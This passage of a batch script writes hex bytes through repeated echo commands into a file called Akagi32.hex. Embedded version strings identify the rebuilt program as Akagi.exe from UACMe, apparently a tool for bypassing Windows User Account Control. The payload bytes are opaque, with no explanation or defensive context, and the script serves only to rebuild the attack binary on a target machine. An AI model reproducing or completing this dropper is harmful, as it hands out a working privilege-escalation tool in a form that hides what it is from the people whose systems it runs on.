echo 69 00 00 00 68 00 22 00 01 00 4c 00 65 00 67 00 61 00 6c 00 43 00 6f 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 43 00 6f 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 20 00 a9 00 20 00 20 00 32 00 30 00 31 00 34 00 20 00 2d 00 20 00 32 00 30 00 31 00 37 00 20 00 55 00 47 00 20 00 4e 00 6f 00 72 00 74 00 68 00 00 00 3c 00 0a 00 01 00 4f 00 72 00 69 00 67 00 69 00 6e 00 61 00>>Akagi32.hex
echo e e480>>Akagi32.hex
echo 6c 00 46 00 69 00 6c 00 65 00 6e 00 61 00 6d 00 65 00 00 00 41 00 6b 00 61 00 67 00 69 00 2e 00 65 00 78 00 65 00 00 00 2c 00 06 00 01 00 50 00 72 00 6f 00 64 00 75 00 63 00 74 00 4e 00 61 00 6d 00 65 00 00 00 00 00 55 00 41 00 43 00 4d 00 65 00 00 00 3a 00 0b 00 01 00 50 00 72 00 6f 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6f 00 6e 00 00 00 32 00 2e 00 37 00 2e 00>>Akagi32.hex
echo e e500>>Akagi32.hex
echo 30 00 2e 00 31 00 37 00 30 00 35 00 00 00 00 00 44 00 00 00 01 00 56 00 61 00 72 00 46 00 69 00 6c 00 65 00 49 00 6e 00 66 00 6f 00 00 00 00 00 24 00 04 00 00 00 54 00 72 00 61 00 6e 00 73 00 6c 00 61 00 74 00 69 00 6f 00 6e 00 00 00 00 00 09 04 b0 04 00 00 00 00 61 46 85 0b 40 94 5b fa 34 4c b9 70 e6 cc 98 b2 65 c2 b5 f4 e9 2d 5a 0d 6b ee 80 5a a6 2c dc 88 78 f2 5d 0b 66 23 44 b7>>Akagi32.hex
echo e e580>>Akagi32.hex
echo d4 d2 b9 c7 ef 01 b9 88 61 c3 c9 c6 37 79 32 dc 18 d6 8d 2b c4 03 bf c2 00 af 85 2b 75 4c 35 d9 01 a8 99 73 84 a9 b8 42 14 ac a5 62 16 43 7a f1 24 85 8d 36 d9 ec bc d5 4f cf 88 01 32 29 eb b7 70 a3 41 0e bc d2 0e 1e 20 c7 86 8c f7 70 74 e6 69 d9 3a 5f 98 2c d8 b7 ac 82 1b 24 4f 3c 59 b0 f8 f3 e2 73 e1 04 d8 59 43 ec 84 0c db 6d ce b7 64 84 c4 47 d5 04 d9 8b 65 8c 83 0d 46 68 5b b7>>Akagi32.hex
echo e e600>>Akagi32.hex
echo 6e 90 b8 76 e6 87 88 e2 63 9a 80 1f f6 2d 58 94 60 d7 fd 55 b6 6c de b0 70 be 86 1e bb 07 49 37 6d cc 39 72 c6 4c 99 30 61 20 95 8b 16 2d 5a b7 68 c7 ac 48 37 6d 95 32 6d 12 05 09 16 bf b4 79 6f d3 f9 0d e3 cd 8d b2 74 c3 87 8a 09 2d 55 b4 68 96 ad 79 b6 6c 88 dd 61 c2 f9 1b 86 2d 5b d3 ee d5 b9 c3 e6 d0 98 00 60 72 04 0e 9f 2c 9a b5 6b f8 c1 d6 bf cd df 30 32 42 1d 18 38 59 b3 d2>>Akagi32.hex
echo e e680>>Akagi32.hex
echo 16 a8 39 7c fb cd 70 31 29 c3 e5 0c 97 28 d2 ac 6b f7 cd 75 c4 08 b9 70 15 a3 85 0b 4c 5e 5b b1 6e d8 83 73 e7 c1 92 38 68 42 87 cb 96 6d 74 c6 e8 df 6f dc b6 cc 13 b7 24 c1 45 02 d6 cd 75 c5 1d ae da 73 e2 0e a2 f0 5d df 87 07 68 68 52 76 6a 14 be 29 d3 00 46 df 61 c8 47 35 d6 6d 9a ed 6e 5e 77 7a 18 8e d3 34 1e c1 fa 1b 69 3d 25 a5 14 c6 e0 4b 36 af 8d 3b 8d 43 69 1f 36 73 5b 3a>>Akagi32.hex
echo e e700>>Akagi32.hex
echo 2b 24 ef 23 8c c4 f2 30 9e f1 73 f4 03 5d 7a b5 6b c6 28 9b b9 e4 d3 b1 61 c2 85 86 53 d1 0b e1 38 b6 39 6a 19 b9 60 cf 74 aa 85 08 16 10 79 b5 6b 16 a2 de 73 6d b8 b9 36 3d f0 f7 40 d2 4e b5 5a 7c bb f8 1e 49 67 3f e5 ac 2a 8b 14 2c 5c 55 69 81 e5 5d d7 65 55 f1 21 c1 7a 3c e9 38 3f 37 6b 56 39 73 18 04 97 86 a1 92 64 0a 34 4d db b2 63 57 54 7a df 19 df b4 df 42 45 0a fd 1e d6 36>>Akagi32.hex
echo e e780>>Akagi32.hex
echo 6e dc 59 8c 19 f1 67 3f 61 c2 d5 7c 11 93 c2 d4 69 c9 ed 5f 86 b8 d8 b0 21 c6 3d ca 17 3d 9b b6 4e 96 bd cb 0e 4c 99 3f 24 04 0e fb 12 94 50 14 73 53 41 a6 49 93 d8 76 61 c2 c5 88 ff 2c 2e fd 99 bc aa 5b 06 cf c8 bd a3 c0 ed 0b 0a 0c 5a a5 3b 29 b8 0b b7 2c da 33 a5 d2 d2 f4 03 0d 4e 97 6f 83 bb 68 8a ec 99 b5 97 b6 45 16 7c 6d a5 a0 57 b6 ac 1f b0 29 78 b5 35 63 84 f4 03 75 9b b7>>Akagi32.hex
echo e e800>>Akagi32.hex
echo 30 d4 32 96 bb ed be b3 8d ae d6 0f 40 7a ba a9 58 29 fd 33 af 3d b8 e8 36 aa d1 4b 1d 45 fb 92 ee dc 32 ac 6f b1 64 b9 1c 3a 45 82 6b d9 a5 a0 6f 56 ab 3b a9 68 5d 9a 41 c1 bc 56 ea 22 df 95 5e dc b8 f8 d3 dc 58 32 0b c6 05 53 9f 68 aa 3c 2e 2e ad 74 f6 3c 55 f5 95 4b b8 eb 7d 3d 9a 97 6f 2c e9 24 8e b8 38 39 21 ea 15 f4 c0 a6 57 14 69 53 6d db b2 6d b8 ba 6e 86 c8 ff 46 7a 0c 9f>>Akagi32.hex
echo e e880>>Akagi32.hex
echo 39 b4 39 90 e5 45 3a 33 9e 14 00 4a 1a ea 9a 9e e0 93 55 1b d6 54 00 4f 74 ee 85 07 56 3a 47 77 6e 3f 8b b5 4f 6c 9b 31 6c 95 d6 58 93 2a 9b b3 4b a3 ca d0 83 48 58 b4 09 5a 84 0a 1c fb 0c 48 b8 b6 fd 29 66 47 52 bd 24 5a 0d 13 34 05 da 4d 01 c6 f4 d6 f3 8c 7d b1 b0 c2 86 82 43 b5 7b bc 26 5c bf 93 e4 dd 58 25 f9 92 d6 09 16 7a 09 4a 6f c3 9d fb b4 e7 00 35 ba b6 05 1b e9 58 bb 3c>>Akagi32.hex
echo e e900>>Akagi32.hex
echo 5b c4 79 72 e6 33 4e cf 14 26 7a dd 41 39 30 b5 cd c4 ed 9a b4 19 24 4f e5 d7 89 0b 17 ae 3e 4b 6e 5b 9e 7b 19 d9 90 51 63 bf 79 0b 62 2b 53 54 74 94 a9 04 e8 e7 1b eb 20 e7 aa ef ee ac b7 cf ee 46 8a 73 26 8c cb 66 58 87 89 04 b2 a8 14 f5 41 be 6d ba a1 79 99 a9 e1 2a d9 f5 e9 d2 68 6c 2f fe ff 5e c6 cf 7b 29 25 e6 9d 02 0c 69 56 91 63 f0 b7 1b b5 e5 8c 94 79 e1 e1 11 95 65 1f 93>>Akagi32.hex
echo e e980>>Akagi32.hex
echo 0e 39 ba cd e2 49 18 38 ec c2 87 5d 46 45 ba 37 67 f0 95 7b a2 cc d3 34 ae 82 af 30 d0 09 54 34 6f f3 00 63 86 60 15 b4 2d e6 f5 4b 46 08 5d d3 e0 76 ab d6 b4 e0 ba b2 07 47 45 7f 0a 22 5b 00 9e 51 ed 57 86 47 59 30 4a 12 e3 82 27 ae 9b b7 2b d9 1a 5f bc e7 28 d0 62 b7 c5 e4 25 ed 3d 3e 6f 59 bc 4a ef cf 91 44 69 a2 81 6d 2f 34 2f b5 93 bc ce e1 a6 4e d8 a0 a9 9c ae da 16 2a d6 fe>>Akagi32.hex
echo e ea00>>Akagi32.hex
echo 61 db b9 69 ec 9c 18 24 7d 43 85 63 46 7e 30 e3 7b 97 9f bb a7 f8 38 a1 31 c2 b6 0b 97 4f 4d c3 71 23 cd 57 ee 2a aa b0 15 e6 89 f4 c0 14 47 b4 4d 56 d8 5e 5e 9f 23 4f 9e 52 87 c1 52 bd 59 e9 bf ca 7b 7f 16 c1 b7 30 9e dd 84 14 17 32 5b aa 6a c9 ac 44 b7 73 d9 af 60 3d 9a 0a 09 2c 44 b6 71 dd a6 72 f9 cd 87 31 7e c3 7a 14 17 32 5b aa 6a c9 ac 44 b7 73 d9 af 60 dd 84 88 09 2c 41 b6>>Akagi32.hex
echo e ea80>>Akagi32.hex
echo fc 4e b9 73 4c fc 98 5a db f2 85 c1 26 2d 24 85 6b d7 af 93 e6 fd d8 b0 b7 f2 85 e9 26 2d e9 e2 5e dc 45 43 e6 de 28 31 45 f2 85 af 43 9d 5a 3d 5b d6 db 6b b6 06 e8 b0 8f 6f b5 0b 4e 1d 5b c6 6d 84 49 72 a2 fc 98 26 05 f2 85 fa 16 d1 2a b5 79 45 ad 8f b6 40 e8 b0 27 f2 85 ed 62 2c ea b6 2f ed b9 3f e6 a3 98 47 b1 eb d5 0f 16 5f ca b5 08 d6 c8 5b c5 7d c8 b0 61 c2 c8 9b 16 49 5b de>>Akagi32.hex
echo e eb00>>Akagi32.hex
echo de dc cc 73 8b 13 99 b0 62 8a 35 0a 9e 4a 5a dd db d7 e4 5b d8 ac 53 18 04 c2 e2 1b 12 44 cb b7 17 23 bb a2 16 ce cb 30 18 b2 80 7f 46 28 ab b1 72 e9 ae 7b b6 71 d0 c0 fd c2 cc 0b 36 69 5b 8a 6e f9 29 e9 93 cc ce 1c de c4 b5 0e 5a 3d 5f c3 5b d6 c1 0e c4 6e af 02 6a 91 15 07 70 bd 53 c0 6a dc d8 43 ef a9 98 6c 61 83 b1 0b 7d 9d 5a d2 5b dd 0d 53 b6 2a a5 40 65 a3 75 01 a7 2d aa b8>>Akagi32.hex
echo e eb80>>Akagi32.hex
echo 9f df c8 77 92 91 a8 33 04 d2 86 7a 17 3a 59 95 bb d4 c8 f0 26 6d 69 bb 13 f2 8d 6d c6 28 2e 87 61 b5 6b d6 e6 84 2a 37 0d f2 84 fa 1f 6c ef 85 cc bb fd 5d c4 bc de 63 c4 e7 95 02 bd ba 54 86 78 b3 09 77 c3 fc 91 43 79 d3 dd 38 16 1f 4a b4 1a d1 ce ab a0 08 6c b0 4f 92 80 73 26 2d 4a b6 6e ea 0d 79 eb 2c 98 dc 51 c2 15 84 16 2d 46 25 12 56 ad 7f b6 59 6e c8 4a c2 37 0b d6 7f 5b 5f>>Akagi32.hex
echo e ec00>>Akagi32.hex
echo 1e dd 88 73 8e 7c 28 30 69 e4 85 0b be 04 5a b5 e9 61 1d 5a fd 40 d8 b0 86 f2 85 2b 62 00 5b b7 94 ec b9 e2 c8 7c 98 30 70 ed 35 8f 26 2d e7 25 16 d6 3f 6a b6 6c f2 82 61 c2 07 bb 26 2d 6e 84 6e dc 7d 43 e6 00 df 04 51 0b b5 0b 26 18 2a b5 5b d6 ad 09 80 6c d8 b5 56 c2 85 89 8f 1d 5b bf 56 dc b9 f0 d6 cc 1a ca 51 c2 f2 32 16 2d ae 85 6b f6 f3 61 b6 6c 10 80 61 f4 be 03 16 2d f8 87>>Akagi32.hex
echo e ec80>>Akagi32.hex
echo 6e cf 85 73 e6 c6 1a 00 61 31 b5 0b 74 10 5a b5 69 26 9d 5b 11 52 d8 b0 2b fd 2d 0b 16 e1 6b b7 27 fc 3d a3 d6 cc 34 7b 20 32 80 3b 16 1d ca 12 df e6 ad 57 87 2f a8 81 51 c2 99 4f 16 2d f1 c8 5e dc 50 43 e6 94 a8 f5 a2 f2 85 2b 3b 6b 5a b5 fd e6 ad 47 f1 ef a8 bd 51 c2 cd 43 16 2d b7 87 6e dc 25 3a e6 cc ae 7a 61 c2 87 ca 26 2d 05 fe 6b d6 a4 17 be 6c d8 64 51 c2 4a 46 16 2d 9b 15>>Akagi32.hex
echo e ed00>>Akagi32.hex
echo 20 dc b9 36 a9 fc 9f 00 61 e2 c9 5b 16 2d b2 85 6b bb fc 53 b6 6c 01 80 61 8a d7 0b 16 af 98 87 6e 95 ea 73 e6 1e a8 30 a1 a8 d1 0b 16 3f 0f c5 7b e6 ad 57 8d 3a e8 b2 51 c2 eb 5c 16 2d 51 5c 5e dc 2a a3 2a f9 c1 30 61 40 36 3b 16 02 00 b5 6b 62 9d 5b ba 56 83 00 6a f2 85 26 4a 2d 5b 35 c7 ec b9 5d bb cc 98 9b 51 c2 85 6e 48 2d 5a 9d 34 d6 ad d9 7c 5c d8 d3 01 c2 85 ef 26 2d 51 db>>Akagi32.hex
echo e ed80>>Akagi32.hex
echo 5e 63 49 43 e6 a6 fa 30 61 68 5b 3b 16 73 ea 0d 82 e6 ad d5 56 48 d4 97 04 72 96 3b 16 41 3d b7 6e ee 5a 43 e6 92 ff c0 6a f2 85 57 7e 25 5a b5 b3 e6 ad 0f df 6c d8 32 83 f2 85 57 7c 2d 5b 66 5e dc 15 3d 8d 3c 9a 00 61 fc 25 2d d7 1d 5a bf 23 a6 62 97 86 6c 97 de 61 c2 87 d1 26 2d 2a d8 6e dc 8c 03 eb fc 86 41 51 ca b5 0b 6f 5f 5a b5 c1 ca 5d 9d 03 5c d8 8f 91 04 51 3b 16 61 31 c2>>Akagi32.hex
echo e ee00>>Akagi32.hex
echo de cf 89 73 93 ba 28 13 16 ca 85 0b 92 1d 5a bb 13 d6 ad 71 22 5c d8 82 51 e4 65 3b 16 49 21 bf 6e dc 6e 43 e6 9f e3 30 61 e8 50 3b 16 1b ea 6e d6 e6 ad 0c cb 47 28 b9 51 c2 d5 7b d0 f3 6b b7 16 a3 b2 f3 c1 0c 49 4d 51 c2 82 8a 16 2d d8 0f 5b d6 c0 d9 b6 6c 2b 80 61 c2 fd 88 16 2d 53 33 6e dc ab a0 d6 cc 36 b5 91 87 03 0b 16 af 87 85 6b b8 2a 5b b6 94 e8 b0 ad 40 0d 7b 16 1d 5b f3>>Akagi32.hex
echo e ee80>>Akagi32.hex
echo e7 dc 16 43 e6 4e 4e 00 61 e3 0f 0b 16 46 6a b5 91 67 9d 5b b6 dd 0c 8f 61 a0 65 b4 17 5d 53 48 d1 de 06 71 d9 ce a7 32 5e c0 ba 09 29 2f 65 b7 68 e9 af 69 b4 d7 6f b0 61 d2 85 0b 41 a2 5b b7 6e 59 92 73 e6 d6 b4 30 61 40 28 0b 0e 7f 77 b5 6b 11 ad 43 96 32 f6 b0 61 37 85 07 48 02 5b b7 6e 8f 89 73 e6 94 a9 38 61 c2 78 0b 1a a5 68 b5 6b f6 a4 68 b6 6c 4a b0 6d e5 b1 03 16 2d c3 b7>>Akagi32.hex
echo e ef00>>Akagi32.hex
echo 68 d5 8c 73 e6 4e 10 30 67 db b3 0b 16 91 5a b3 4b a9 9a 5b b6 88 d8 b6 3c fa 8d 0b 16 f7 5b b1 25 e5 b9 73 64 18 98 36 24 f8 85 0b be 2d 5c 15 72 ed ad 5b 32 6c de 43 61 c1 a5 6f 2a 2d 5b 66 6e df ff 4e ee cc 98 9f 61 c1 e7 35 16 2d 56 a8 54 d6 8a 5b b5 4d 98 b0 61 f0 27 0b 15 02 1a b7 09 dc ba 7a a4 4f 98 57 61 c1 94 48 16 2d d8 b5 68 76 ae 1f b6 6c be b0 62 0b 85 08 36 17 1e b7>>Akagi32.hex
echo e ef80>>Akagi32.hex
echo 6e 7b b9 70 f6 8a b0 30 61 b9 85 08 f4 2d 59 32 2c 56 ad 5b ae 24 d8 b0 c8 c2 86 8f 76 64 5b 00 24 dc b9 e7 e6 cf b8 2f 2a c2 85 db 16 2e 29 f9 6a 56 b2 16 b6 6c b1 fe 61 c2 49 07 59 ad 64 37 6f c6 e9 f3 e5 4c 99 10 33 93 85 0b af ad 5b 9f 39 de ad 5b 21 ec d9 90 32 c2 85 89 b5 ad 5a 85 3a dc b9 a0 66 cd 58 b2 34 c2 85 04 40 ad 11 35 6a f6 e6 0c b6 6c 1a 30 60 87 dd 8b 16 2d 56 ee>>Akagi32.hex
echo e f000>>Akagi32.hex
echo 6e dc 37 f3 e7 ec 91 6a 61 c2 03 8b 17 3e 01 36 eb 43 2d 5a b9 30 d8 b0 1d 42 84 07 11 70 db bc ee dd b8 2d e6 cc 9a ca e1 c3 02 54 16 2d 64 d5 e8 56 98 db b7 2c b9 b0 61 0b 05 0a 36 65 39 b7 6e 64 39 72 d3 af 9b b0 62 42 84 40 72 2d 5a b7 0e de ad 5b ce ec d9 f9 07 c2 85 89 d6 ad 5a 80 09 dc b9 c2 66 cd 54 18 09 42 3c 8b 17 0d 33 35 4a 56 ac 97 8a 06 58 53 e1 c3 a3 60 96 b0 db b6>>Akagi32.hex
echo e f080>>Akagi32.hex
echo 4e c6 d5 73 e6 5f 18 31 41 af 4d 0b 16 8c da b4 43 b8 2d c8 36 6d 94 8e 0e 42 04 cb 16 e6 2b 77 3a ad 39 73 e6 f1 ea 30 61 24 45 0b 22 ae 29 75 27 a2 6d 67 76 6c 9a c5 69 c2 85 c8 d6 2d 1d c1 6e dc 3b a6 26 cc c6 47 61 c2 5e cb 16 0d 28 cd 6b d6 4f 9b b6 df a1 30 61 c2 bc 71 16 2d e0 77 6e d0 a6 08 26 e6 58 30 7f be 85 0b 94 57 9a b5 5a ab ad 5b 18 ac d8 90 4a bc 85 0b b0 ed 5b f0>>Akagi32.hex
echo e f100>>Akagi32.hex
echo 11 ef 79 f1 26 cc cf b0 a1 40 45 0b 7d ac 6a b5 6b ec 2f 9b c8 ac d8 f6 e2 c1 45 1e d6 2d 3d 33 6e dc c8 f6 d6 cc 98 2c e7 02 e5 cb 16 11 dd b6 ab d1 6d 5b e6 e4 d8 b0 8a 48 24 cb 56 a6 5b b7 75 1c b9 42 26 cc 32 74 a1 c2 cb cb 16 75 9a b5 18 16 ad f1 39 ac d8 1a a1 c2 38 cb 16 ff 9b b7 44 38 79 73 03 0c 95 de a1 c3 b2 82 3e 2d 5a c8 ab d6 64 9b b6 6e 54 1b a1 af 45 19 01 ed 5a 90>>Akagi32.hex
echo e f180>>Akagi32.hex
echo ae dc 85 b3 e6 66 d5 f0 61 a6 45 0b 63 ed 5a 3a ab d6 07 fe 76 6c 65 70 61 11 45 0b fe ed 5b 35 9b 1c b9 78 6b cc 98 10 a1 c2 2f 30 d6 2d 15 75 6b b3 6d 5b c1 ac d8 1a ec 02 85 95 d6 2d eb 77 6e 1a 79 73 cc 1b 58 30 84 02 85 f1 d6 2d 4c 3b c3 d6 ad 04 76 76 f1 70 60 61 45 0a bc 6c 9b b6 3a 1c b9 1c 26 cc 1b f0 61 68 1d cb 16 9e 9a b5 a6 16 ad 82 76 6c 72 5f a1 c2 78 cb 16 35 9b 53>>Akagi32.hex
echo e f200>>Akagi32.hex
echo 44 1c b9 79 d8 0c 98 7b a1 c2 85 0b 17 2d 5a b7 6b d5 ad 5f b6 69 d8 b0 67 c2 82 0b 1e 2d 52 b7 6e d6 b9 78 e6 c0 98 3d 61 ca 8b 0b 19 ad ab a4 6b c4 ad 5b a5 6c cc b0 74 c2 93 0b 16 3a 5b af 6e c5 b9 69 e6 cc 83 30 7d c2 98 0b 08 2d 5a aa 6b f6 ad 7a b6 4e d8 b0 42 c2 a1 0b 33 2d 7d b7 6e fb b9 5b e6 e5 98 1a 61 c2 ae 0b 3a 2d 77 b5 45 d6 ad 74 b6 5c d8 81 61 f0 85 0b 25 2d 6f b7>>Akagi32.hex
echo e f280>>Akagi32.hex
echo 5b dc 8f 73 e6 fb 98 08 61 fb 85 31 16 2d 61 b5 57 d6 90 5b 88 6c d8 8f 61 82 85 4a 16 6f 5b b7 2d dc fd 73 a3 cc de 30 61 85 85 43 16 64 5a ff 6b d6 e6 5b fa 6c 95 b0 2f c2 85 44 16 7d 5b e6 6e 8e b9 73 b5 cc cc 30 34 c2 d3 0b 16 7a 5a ed 6b 8f ad 01 b6 6c 83 b0 3d c2 d8 0b 48 2d 5b e8 6e bc b9 12 e6 ae 98 30 02 c2 e1 0b 73 2d 3c b5 6b b1 ad 33 b6 05 d8 da 61 c2 ee 0b 7a 2d 36 b7>>Akagi32.hex
echo e f300>>Akagi32.hex
echo 00 dc b9 1c e6 bc 98 41 61 b0 85 0b 65 2d 2e b5 1e d6 db 5b b6 1b d8 c8 61 bb 85 71 16 2d 20 b7 12 dc c4 73 98 cc 98 4f 61 42 85 8a 16 af 5a b5 e8 d6 29 5b 33 6c 5e b0 61 45 85 83 16 a4 5b 3d 6e dc 32 73 6a cc 15 30 ef c2 85 84 16 bd 5a 24 6b 44 ad 5b 25 6c 4c b0 f4 c2 13 0b 16 ba 5b 2f 6e 45 b9 e9 e6 cc 03 30 fd c2 18 0b 88 2d 5a 2a 6b 76 ad fa b6 ce d8 b0 c2 c2 21 0b b3 2d fd b7>>Akagi32.hex
echo e f380>>Akagi32.hex
echo 6e 7b b9 db e6 7c 98 81 61 c2 37 0b a5 2d ee b5 de d6 ad ed b6 db d8 08 61 7b 85 0b ac 2d e0 b7 d2 dc 10 73 e6 71 98 9a 61 69 85 a7 16 2d e4 b5 c6 d6 12 5b 76 6c d8 71 61 00 85 c8 16 e9 5b b7 ab dc 7f 73 21 cc 50 30 61 0b 85 c1 16 e6 5a 79 6b d6 60 5b 78 6c 17 b0 b1 c2 85 da 16 ff 5b 64 6e 08 b9 73 33 cc 4e 30 b6 c2 5d 0b 16 83 5a 6c 6b 79 ad 81 b6 6c 03 b0 bd c2 58 0b c8 2d 5b 68>>Akagi32.hex
echo e f400>>Akagi32.hex
echo 6e 3c b9 92 e6 2e 98 30 82 c2 61 0b f3 2d bc b5 6b 31 ad 1d c3 0e ad db 08 c2 b6 39 38 49 37 db 6e e3 b9 4c d6 f3 bc 71 13 b0 e4 0b 6f 6d 1f f5 3e b8 ef 18 b6 20 98 f0 30 87 c4 4a 56 2d 0b f2 2c 89 86 57 af 8f 98 5f 0d ae e0 68 62 44 35 b7 05 36 ae 6a f6 2c 82 b0 3d c2 d9 34 4a 4a 37 d8 0c bd b9 1f 94 a3 f7 44 3d b1 fc 9b 65 59 3f d8 23 d7 9e 69 d7 6e d8 c0 13 a7 f5 57 63 43 39 8f>>Akagi32.hex
echo e f480>>Akagi32.hex
echo 0d b0 97 2c ea 81 94 17 67 8e ec 0f 65 59 1a a4 2a 80 fe 2f c4 b4 b1 de 06 e7 91 21 03 75 24 a5 16 ce a0 4c ea 8d d8 10 6d 80 97 43 77 5e 1a dd 1f b7 cf 37 d3 3c ca e0 21 87 c4 5d 27 1f 1b 9d 7d 94 43 3b 19 e9 f5 43 72 9d 88 5b 1b af 4e fe 5d 29 e4 61 a9 49 4c a1 3b c8 0b 05 37 0c 84 82 31 94 a6 5e c2 95 90 0f 67 ef a4 68 1f 68 34 c0 eb bb c8 29 d7 18 b7 c2 4e d9 5a 00 02 e2 4a 28>>Akagi32.hex
echo e f500>>Akagi32.hex
echo 43 43 94 b3 d5 85 a7 36 fe e8 7a 38 23 1d 5c d6 62 94 8a a0 80 93 df 4f 66 3d 82 0c e7 2a 94 b3 68 f7 ea 1e 87 be ec d0 31 b6 f7 4b 40 68 64 3a 78 53 be a4 bc 78 b9 b2 4e c1 23 09 99 6d d4 f7 d1 f8 0b 7c 09 e3 91 1f 68 b4 83 00 5f 6c 05 b9 7c 97 8f 52 49 73 de 21 2c c0 97 54 10 72 5d d5 21 8a bf 1c e5 31 4a 61 21 0d 8a c4 19 e2 55 1a 62 79 a4 a5 fb b3 fd ba 75 9b 2a 02 6a 1b 14 a7>>Akagi32.hex
echo e f580>>Akagi32.hex
echo 2e 43 ea 4a b8 33 1e 65 2e cf ca 06 59 20 16 b8 34 e9 45 3f 1d 6a 77 2f 62 8d b6 4d 25 02 3c c3 41 bb ca 8e a4 43 0f 16 1e cb f3 02 35 14 1b c7 0c a6 ef db d8 18 9d c8 02 a7 f5 c9 78 94 c0 90 2c 9b 36 2f 09 f5 77 09 51 4d 80 8c 99 28 6b cd 1e d4 e3 2e da 00 97 b8 8e 36 fd 44 1e f2 2c 68 0a e3 ff 7b 29 c9 50 4e 66 03 80 4b 0f a8 52 fa 1e a2 e2 3d 56 3e b9 de 06 a7 6a 03 f9 25 94 37>>Akagi32.hex
echo e f600>>Akagi32.hex
echo 81 48 b0 9c ee 2b 90 1f 67 ac 79 25 74 3a 1a bc 94 f9 a5 74 be 43 d0 9f 69 34 0d 04 13 25 5e b7 69 dc f0 20 83 be f1 51 0d ab 3b 71 d4 53 73 ae 04 8c d2 7b c9 4c e8 bf 64 e1 20 1c 15 05 12 d9 18 3c bf 17 a5 b0 f9 43 5e ea 47 34 69 2a 25 b2 14 d1 9d c4 c9 69 58 2c 9d ce 74 05 f5 2a 14 c7 df ae 46 c3 78 33 89 3f 76 cd 92 04 01 2b 4d c1 63 dc ab ad 04 6c a8 c4 08 ad eb 4b 43 43 5b f5>>Akagi32.hex
echo e f680>>Akagi32.hex
echo 2d 90 f9 33 b7 89 d9 30 20 82 d5 4e 54 6a 1a ef 6b d6 92 64 86 25 b6 c6 00 c2 e9 62 72 62 2b d2 1c bd 98 72 7e 89 e0 53 04 d0 39 5d 45 2d 2e c7 02 b8 ca 1b 87 2c d9 b0 11 9e d9 34 4a 4a 37 d8 6e be d8 1f 94 a3 f7 44 3d 82 f6 72 65 59 3f d8 63 c2 9e 59 84 6d fe c0 13 a7 f5 57 63 4d 35 d5 0d b0 97 45 8f ff a0 60 19 87 c4 5d 11 e4 33 07 fb ea ad 3a fb 2c ad dc 15 ab d6 71 9c ec 03 ab>>Akagi32.hex
echo e f700>>Akagi32.hex
echo 34 dc 88 d0 f2 e9 9a 02 15 a3 e7 77 7a 48 de 66 7b 21 1e 40 aa 79 c6 ae 29 30 cd 3f 9a 60 2e 2e 70 5e ac 69 f9 fa c0 37 f4 df 85 1f 16 31 14 da 1f 85 d8 db c6 1c b7 c2 15 a7 e1 5d dd 22 1a 60 df 87 9f 64 e6 ee d7 52 0b a7 81 68 62 e7 ce f4 2e 94 fb 6b 59 da 63 aa 6b d1 8b 74 3a 40 2a 36 5e d1 3a 58 19 5c cf 4f 7b c7 15 3a 1b 37 50 d5 71 26 ae df 15 93 07 87 0e 5e 32 02 41 20 a4 d4>>Akagi32.hex
echo e f780>>Akagi32.hex
echo 0e 77 e6 68 00 76 9b 35 02 a1 94 49 63 44 36 d1 0e c8 df 64 39 73 60 aa 6b 22 9e 53 7b 41 db f3 01 bf cc 1e 83 a2 13 62 66 bd c1 79 52 f5 53 8a 54 e7 92 7f d6 25 9b df 0d ae 85 6b 77 f6 1e ca 8b c7 ec d2 3d d3 96 21 6f 9f 8f 88 18 61 aa dc 18 a2 ed 84 bb 93 39 71 6c 51 8c 0a 14 20 08 da 0f ae cd 23 92 cc ea 70 37 fd a1 4a 64 5f ae d4 12 b6 5b 1a d3 9c bc 0b e4 dc 1a 14 ef e2 46 ce>>Akagi32.hex
echo e f800>>Akagi32.hex
echo 1d 06 c0 a3 ee d3 9f 81 0d 81 9a f4 8b 2b 47 b2 44 dd 8c 50 54 61 97 b4 ac c6 ba 10 e9 62 de 46 7a e3 89 12 c6 a2 93 6f 66 b0 0a 54 11 d2 2a 25 fb f4 01 50 49 62 99 23 4e c8 aa 01 39 27 44 c5 e1 46 ac ac e3 15 9d 90 69 83 f7 6c e9 2f 6e 3b 0e c9 a5 44 be 73 d0 a3 69 8d 80 0f 32 ee 1e b2 e6 db f7 06 8a a0 57 37 3e f7 fc 64 89 59 3f ea 5e 59 a8 90 13 63 d0 c4 61 8d f0 7f 59 4b 09 d6>>Akagi32.hex
echo e f880>>Akagi32.hex
echo 00 a0 de 16 89 c4 f7 38 0e ca ea 03 c7 8a 6b 4a 5e c6 42 5e 20 dd 10 b8 ce c5 2a 0c b9 2a f4 b0 61 7e be bc e2 08 9c e0 70 8b d6 6e 64 d7 33 b5 d3 ac 3c c0 93 46 5d b8 7e aa 95 0d e5 45 44 b8 5f e3 88 7c e3 fc 27 a8 6c 36 3b fb 55 4c 29 c1 14 df e2 55 f9 62 97 be 9e 80 8b 74 13 0a 9c 58 69 33 7f cc e9 d3 5e 2f a7 3d be 47 22 25 95 b0 a6 d3 2d 4c 79 c9 a0 a2 ee d5 7a 84 01 20 0f b8>>Akagi32.hex
echo e f900>>Akagi32.hex
echo 6b 57 ae ec 7b 84 41 25 73 4d 82 d4 99 2a d7 b2 e4 d3 22 5e 26 b2 e9 8b f6 dd 82 e4 e9 69 a4 f3 9d 98 26 77 a6 4f cc db 2c ed 83 f4 39 2b 75 b3 48 d0 32 5f 9c 6a 84 3d fe c4 1a 0d a1 b2 5d 2e 68 d3 bc 32 e2 cb f7 b8 21 2d 83 14 f9 2b b5 b3 88 d0 42 5f 50 68 e7 8f 53 4b 1e 1e 45 6c 9b c4 36 83 f2 8c 35 cb 97 c7 6e 35 42 0f 3c 9e 5a f7 28 9a ed 1b e5 2d 88 b0 24 83 dd 54 5d 6d 01 b7>>Akagi32.hex
echo e f980>>Akagi32.hex
echo 6e e3 86 41 a9 ae f2 55 02 92 f1 4b 43 43 50 6d 22 d6 dd 07 b6 30 e7 ec 06 ae ea 69 77 2d 37 c5 01 b3 cd 2f 95 b5 08 43 15 a7 e8 03 02 1e 68 b4 4d d6 dd 29 d3 1c 84 c5 0f a0 0d 68 7a 03 41 2d 51 e3 8a 7e 32 c2 c0 31 e6 f1 ed 1d 5d 12 65 81 54 d6 89 08 db 0d aa c4 31 b6 85 79 56 7b 08 c3 1c b5 d7 75 81 c9 45 35 66 93 c0 4a 57 6c 5a f0 2a 80 9d 6a f6 2d 9d be 23 c3 86 b8 54 18 6e 88>>Akagi32.hex
echo e fa00>>Akagi32.hex
